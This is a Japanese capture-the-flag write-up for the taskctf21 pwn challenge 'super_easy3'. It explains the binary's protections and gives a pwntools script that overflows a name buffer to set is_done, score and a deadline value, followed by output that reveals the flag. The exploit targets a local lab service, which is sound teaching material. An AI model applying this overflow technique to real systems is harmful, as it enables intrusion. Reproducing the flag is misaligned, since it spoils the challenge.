## 事前知識
詳しくはsuper_easyのwriteupをご覧ください。

```bash
$ checksec super_easy3
[*] '/home/user/work/taskctf21/pwn/super_easy/dist/super_easy3'
    Arch:     amd64-64-little   <- Architecture は amd64-64-little
    RELRO:    Full RELRO        <- RELocation REadOnly の略で、GOT Overwrite という攻撃ができない設定
    Stack:    Canary found      <- スタック上での Buffer Overflow を防ぐための機構が有効である設定
    NX:       NX enabled        <- 実行する必要のないデータを実行できなくする No eXecute bit という機構が有効である設定
    PIE:      PIE enabled       <- Position Independent Executable の略で、既知のアドレスが存在しない設定
```

## 方針
- `is_done`を0以外にする
- `score`を`0x1337`にする
  - little endianであることに注意
- ソースコードに合わせて`dead_line`を条件を満たす値にする

## 解法
サーバの起動

```bash
docker-compose up -d
```

```python
from pwn import *

ADDR = '127.0.0.1'
PORT = 30004

io = remote(ADDR, PORT)

print(io.recvuntil(b'name\n'))

payload = b'A' * 16 # name用の部分を全部埋める
payload += b'\x01\x00\x00\x00' # is_doneに1を入れる
payload += b'\x37\x13\x00\x00' # scoreに1337を入れる
payload += b'A' * 8
payload += b'\x77\xa9\xb6\x61' # 良さげな値を入れる

io.sendline(payload)
io.interactive()

"""
$ python3 solver/solve.py 
[+] Opening connection to 127.0.0.1 on port 30004: Done
b'Input task name\n'
[*] Switching to interactive mode
task
task name: AAAAAAAAAAAAAAAA
task done: 1
task score: 4919
task deadline: Mon Dec 13 02:01:27 2021

taskctf{n0w_y0u_kn0w_t1me_t}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 30004
"""
```

## コメント
bofで書き込みをしつつ、time_tの値を範囲内に収める問題です。想定解法はtime_tの構造を確認した上で微調整をするやり方だったのですが、ログを見る限り脳筋でやった方も多そうでした。
